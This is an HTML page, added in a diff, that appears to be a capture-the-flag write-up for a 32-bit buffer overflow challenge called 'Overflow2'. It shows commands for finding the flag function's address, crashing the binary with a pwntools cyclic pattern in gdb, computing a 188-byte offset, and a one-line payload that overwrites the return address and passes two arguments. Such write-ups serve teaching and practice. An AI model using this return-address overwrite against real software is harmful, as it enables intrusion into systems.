@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" lang="" xml:lang="">
+<head>
+  <meta charset="utf-8" />
+  <meta name="generator" content="pandoc" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
+  <title>Overflow2</title>
+  <style>
+      code{white-space: pre-wrap;}
+      span.smallcaps{font-variant: small-caps;}
+      span.underline{text-decoration: underline;}
+      div.column{display: inline-block; vertical-align: top; width: 50%;}
+  </style>
+  <!--[if lt IE 9]>
+    <script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv-printshiv.min.js"></script>
+  <![endif]-->
+    <head>
+      <link rel="stylesheet" type="text/css" href="../../css/global.css"></link>
+      <script type="text/javascript" src="../../js/common.js"></script>
+    </head>
+</head>
+<body>
+    <div id="header"><a class="header" href="../../index.html">[]|\|[-/-\|_/\/\[]|\||)</a></div>
+    <div id="content" class="content" style="width:70%;height:auto">
+<header id="title-block-header">
+<h1 class="title">Overflow2</h1>
+</header>
+<p>Get the address of flag function with objdump.</p>
+<pre><code>  objdump -D vuln|grep flag
+
+080485e6 &lt;flag&gt;:
+  ...</code></pre>
+<p>Run vuln with gdb</p>
+<p>Input a long string to cause a sigmentation fault</p>
+<pre><code>python -c &#39;import pwn;print(pwn.cyclic(256))&#39;|gdb ./vuln --eval-command r
+...
+Please enter your string: 
+aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaac
+
+Program received signal SIGSEGV, Segmentation fault.
+0x62616177 in ?? ()
+...</code></pre>
+<p>Find out cyclic in with python pwn module</p>
+<pre><code>&gt;&gt;&gt; pwn.cyclic_find(pwn.p32(0x62616177))
+&gt;&gt;&gt; 188</code></pre>
+<p>Accroding to <a href="https://www.exploit-db.com/docs/english/28553-linux-classic-return-to-libc-&amp;-return-to-libc-chaining-tutorial.pdf">return to libc tutorial</a></p>
+<p>Let’s pass the arguments to vuln</p>
+<pre><code>python -c &quot;import pwn;print(&#39;A&#39;*188+pwn.p32(0x080485e6)+&#39;A&#39;*4+pwn.p32(0xdeadbeef)+pwn.p32(0xc0ded00d))&quot;|./vuln</code></pre>
+<p>One flag is in the segmentation fault error.</p>
+    </div>
+    <a id="back-to-top" class="back-to-top" href="#header">TOP</a>
+</body>
+</html>
